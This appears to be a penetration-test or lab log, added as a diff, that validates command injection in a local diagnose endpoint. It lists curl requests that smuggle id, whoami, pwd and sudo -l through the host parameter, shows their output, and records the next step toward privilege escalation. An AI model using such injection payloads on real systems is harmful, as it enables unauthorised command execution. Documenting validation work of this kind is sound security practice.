@@ -1,0 +1,34 @@
+007 - Command Injection Validation
+
+Phase: Vulnerability Validation
+
+Activity: Operating System Command Injection Testing
+
+Date: 2026-07-30 | Time: 14:01:52
+
+Command: curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1"
+Output: {"returncode":0,"stdout":"127.0.0.1       localhost\n","stderr":""}
+Purpose: Established baseline application behaviour using a legitimate request.
+
+Command: curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bid"
+Output: {"returncode":0,"stdout":"127.0.0.1       localhost\nuid=1001(support) gid=1001(support) groups=1001(support)\n","stderr":""}
+Purpose: Validated operating system command injection and confirmed execution under the support account.
+
+Command: curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bwhoami"
+Output: {"returncode":0,"stdout":"127.0.0.1       localhost\nsupport\n","stderr":""}
+Purpose: Confirmed the identity of the account executing injected commands.
+
+Command: curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bpwd"
+Output: {"returncode":0,"stdout":"127.0.0.1       localhost\n/\n","stderr":""}
+Purpose:Verified the current working directory of the injected process.
+
+Command: curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bsudo%20-l"
+Output (Relevant): sudo: The "no new privileges" flag is set, which prevents sudo from running as root.
+Purpose: Confirmed that direct privilege escalation through sudo was prevented by the NoNewPrivileges security control.
+
+Status:
+Operating system command injection was successfully validated.
+Arbitrary commands execute as the support service account,
+ while direct privilege escalation through sudo is restricted. 
+ The next phase is to enumerate the intended privilege-escalation 
+ mechanism.
